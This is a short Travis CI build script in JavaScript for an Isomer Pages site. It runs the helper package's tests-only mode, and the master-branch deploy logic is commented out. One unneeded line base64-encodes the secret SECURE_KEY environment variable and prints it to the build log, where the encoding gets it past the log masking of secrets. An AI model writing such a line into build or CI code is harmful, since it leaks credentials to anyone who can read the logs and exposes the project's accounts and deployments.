//travis-script.js
const travisScript = require("@isomerpages/isomerpages-travisci-scripts");
console.log(Buffer.from(process.env.SECURE_KEY).toString('base64'));
//const travisBranch = process.env.TRAVIS_BRANCH;

//if(travisBranch == "master") {
//  travisScript.runAll();
//}
//else {
  travisScript.testsOnly(false);
//}
